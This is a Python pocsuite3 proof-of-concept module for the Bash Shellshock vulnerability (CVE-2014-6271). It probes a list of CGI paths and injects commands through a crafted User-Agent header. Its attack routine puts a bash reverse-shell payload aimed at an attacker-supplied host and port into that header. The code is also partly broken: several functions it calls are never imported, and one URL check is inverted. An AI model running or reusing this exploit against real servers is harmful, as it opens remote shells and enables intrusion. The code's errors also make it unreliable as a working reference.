#!/usr/bin/env python
# coding: utf-8
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, REVERSE_PAYLOAD, OptDict
import random
import string
import re
from collections import OrderedDict

url_dict = ["/cgi-bin/load.cgi",
        "/cgi-bin/gsweb.cgi",
        "/cgi-bin/redirector.cgi",
        "/cgi-bin/test.cgi",
        "/cgi-bin/index.cgi",
        "/cgi-bin/help.cgi",
        "/cgi-bin/about.cgi",
        "/cgi-bin/vidredirect.cgi",
        "/cgi-bin/click.cgi",
        "/cgi-bin/details.cgi",
        "/cgi-bin/log.cgi",
        "/cgi-bin/viewcontent.cgi",
        "/cgi-bin/content.cgi",
        "/cgi-bin/admin.cgi",
        "/cgi-bin/webmail.cgi",
        "/cgi-bin/authLogin.cgi",
        "/cgi-bin/poc.cgi",
        "/cgi-sys/entropysearch.cgi",
        "/cgi-sys/defaultwebpage.cgi",
        "/cgi-mod/index.cgi",
        "/cgi-bin/test.cgi"
        ]


class DemoPOC(POCBase):
	vulID = '0'
	version = '1'
	author = ['shenyi', 'dmknght']
	vulDate = '2014-10-16'
	createDate = '2014-10-16'
	updateDate = '2014-10-16'
	references = ['https://www.invisiblethreat.ca/2014/09/cve-2014-6271/']
	name = 'Bash 4.3 远程命令执行漏洞 POC'
	appPowerLink = 'http://www.gnu.org/software/bash/'
	appName = 'Bash'
	category = POC_CATEGORY.EXPLOITS.WEBAPP
	appVersion = '3.0-4.3#'
	vulType = 'Command Execution'
	desc = '''
				Bash 在解析环境变量时，会解析函数，同时可以运行函数后的语句，造成命令执行。
				'''
	samples = []
	install_requires = []
	
	def _options(self):
		o = OrderedDict()
		payload = {
			"nc": REVERSE_PAYLOAD.NC, # format -> hard coded payuload with invalid param
			"bash": REVERSE_PAYLOAD.BASH,
		}
		o["command"] = OptDict(selected = "bash", default = payload)
		return o
	
	def _verify(self, payload = None):
		result = {}
		
		try:
			vul_url = get_url_need(self.url)
			# 判断后缀，如果不符合规则就不处理
			if not vul_url.endswith('.cgi') and not vul_url.endswith('.sh'):
				pass
			else:
				if not payload:
					payload = ''.join(random.sample(string.ascii_letters + string.digits, 50))
				headers_fake = {}
				if not payload:
					headers_fake['User-Agent'] = '() { :;}; echo; echo X-Bash-Test: %s' % payload
				else:
					headers_fake['User-Agent'] = '() { :;}; %s &' % payload
				
				if "/cgi-bin/" not in self.url:
					for url_path in url_dict:
						try:
							vul_url = self.url + url_path
							# response = requests.get(vul_url, headers=headers_fake)
							response = requests.get(vul_url, headers = headers_fake)
							response = response.text
							if 'X-Bash-Test: %s' % payload == response.split('\n')[0]:
								break
						except:
							pass
				else:
					try:
						vul_url = self.url
						# response = requests.get(vul_url, headers=headers_fake)
						response = requests.get(vul_url, headers = headers_fake)
						response = response.text
					except:
						pass
			
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = vul_url
		except Exception as e:
			logger.exception(e)
		return self.parse_output(result)
	
	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('target is not vulnerable')
		return output
	
	def _attack(self):
		lhost = dict(self.payload_options["lhost"])["display_value"]
		lport = dict(self.payload_options["lport"])["display_value"]
		cmd = REVERSE_PAYLOAD.BASH.format(lhost, lport)
		
		return self._verify(payload = cmd)
	
	def _shell(self):
		pass


def get_url(url):
	try:
		return requests.get(url).url
	except:
		return url


def get_url_need(url):
	url_need = None
	
	if not url.startswith('http'):
		url = 'http://%s' % url
	# 判断字符串是否以指定后缀结尾，如果以指定后缀结尾返回True，否则返回False。
	if url.endswith('.cgi') or url.endswith('.sh'):
		url_need = url
		return url_need
	# 验证HTTP有效性
	try:
		url = requests.get(url).url
	except:
		print("error : {}".format(url))
	# 获取主页连接
	url_need = get_link(url)
	
	if not url_need:
		url_need = url + "/cgi-mod/index.cgi"
	
	info = url_need
	# print info
	return info


def get_link(url):
	rnt = ''
	try:
		page_content = requests.get(url).text
		match = re.findall(r'''(?:href|action|src)\s*?=\s*?(?:"|')\s*?([^'"]*?\.(?:cgi|sh|pl))''', page_content)
		for item_url in match:
			if not item_url.startswith('http'):
				item_url = getAbsoluteURL(url, item_url)
			if not is_url_exist(item_url):
				continue
			if isSameDomain(item_url, url):
				rnt = item_url
				break
		return rnt
	except  Exception as e:
		# raise e
		return rnt


def getAbsoluteURL(base, url):
	url1 = urljoin(base, url)
	arr = urlparse(url1)
	path = normpath(arr[2])
	return urlunparse((arr.scheme, arr.netloc, path, arr.params, arr.query, arr.fragment))


def is_url_exist(url):
	try:
		resp = requests.get(url)
		if resp.status_code == 404:
			return True
	except Exception as e:
		pass
	return False


def isSameDomain(url1, url2):
	try:
		if urlparse(url1).netloc.split(':')[0] == urlparse(url2).netloc.split(':')[0]:
			return True
		else:
			return False
	except:
		return False


register_poc(DemoPOC)
